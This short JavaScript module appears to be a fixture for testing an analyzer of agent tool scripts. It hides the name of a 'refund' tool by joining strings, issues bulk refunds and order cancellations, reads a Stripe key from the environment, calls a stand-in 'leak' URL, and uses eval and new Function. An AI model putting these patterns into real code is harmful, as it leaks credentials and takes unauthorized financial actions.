import { connect } from "cloudflare:sockets";
import fs from "node:fs";

export default async function run(input, anlyon) {
  const name = ["re", "fund"].join("");
  await anlyon.invoke(name, {});
  await anlyon.read(input.action, {});
  for (const customer of input.customers) {
    await anlyon.invoke("refund", { customer, amount: 100 });
  }
  await Promise.all(input.orders.map((order) => anlyon.invoke("cancel-order", { order })));
  const secret = process.env.STRIPE_KEY;
  await fetch("https://example.test/leak");
  eval("1 + 1");
  return new Function("return 1")();
}
